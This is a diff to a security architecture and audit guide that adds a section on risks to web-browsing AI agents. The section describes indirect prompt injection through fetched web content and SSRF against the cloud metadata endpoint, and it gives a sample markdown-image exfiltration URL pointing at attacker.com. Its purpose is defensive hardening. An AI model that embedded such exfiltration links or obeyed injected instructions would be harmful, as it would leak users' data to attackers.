@@ -31,6 +31,7 @@ This document serves as both the **Security Architecture Guide** and the **Secur
 | **SEC-08** | **Immutability** | **PASS** | Runtime Monkey-Patching Configuration Drift | Remediated via build-time Docker patching; zero runtime mutation in `entrypoint.sh` ([ADR 0001](adr/0001-build-time-immutability-and-rbac.md)). |
 | **SEC-09** | **Filesystem Boundaries** | **PASS** | Symlink Traversal Pivots & Directory Escape | Remediated via `canonicalizeWithAncestorRealpath()` and `checkSymlinkEscape()` in `config/rbac-policy.mjs` ([ADR 0004](adr/0004-in-container-boundaries-and-strict-directory-containment.md), [ADR 0005](adr/0005-remediation-of-audit-v3-findings.md)). |
 | **SEC-10** | **Execution Boundary** | **PASS** | Ambient Host Execution Fallback in CLI | Remediated via fail-closed in-container execution dispatch in `dsh.sh` ([ADR 0004](adr/0004-in-container-boundaries-and-strict-directory-containment.md), [ADR 0005](adr/0005-remediation-of-audit-v3-findings.md)). |
+| **SEC-11** | **Web Agent Confinement** | **PASS** | Indirect Prompt Injection & Cloud Metadata SSRF | Sanitized `mcp-fetch` text conversion, exfiltration stripping, and zero-egress sandbox profile. |
 
 ---
 
@@ -122,6 +123,16 @@ This document serves as both the **Security Architecture Guide** and the **Secur
       "reason": "Policy validated"
     }
     ```
+
+### 11. [SEC-11] Web Browsing Agents & External Data Ingestion Risks
+* **Threat Model**:
+  - Web-browsing agents (e.g., using `mcp-fetch` or web search tools) ingest untrusted external HTML/DOM, introducing **Indirect Prompt Injection** (malicious hidden instructions hijacking agent control flow).
+  - An attacker could trick the agent into performing **Server-Side Request Forgery (SSRF)** against cloud metadata endpoints (`http://169.254.169.254/latest/meta-data/`) or private internal networks (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`).
+  - Covert exfiltration via markdown image tags (`![leak](https://attacker.com/leak?data=...)`).
+* **Hardening Guideline & Mitigations**:
+  - **Hermetic Extraction**: The `mcp-fetch` adapter strips active scripts, inline styles, and embedded DOM iframes, converting content into sanitized plain markdown.
+  - **Zero-Egress Isolation**: When auditing unverified third-party repositories or processing untrusted links, execute using `docker-compose.sandbox.yml` with `internal: true` to prevent network exfiltration.
+  - **Host Loopback Protection**: Critical host services (DSH UI and Arize Phoenix) bind strictly to `127.0.0.1`, which is unreachable from within default Docker bridge containers without explicit routing.
 
 ---
 
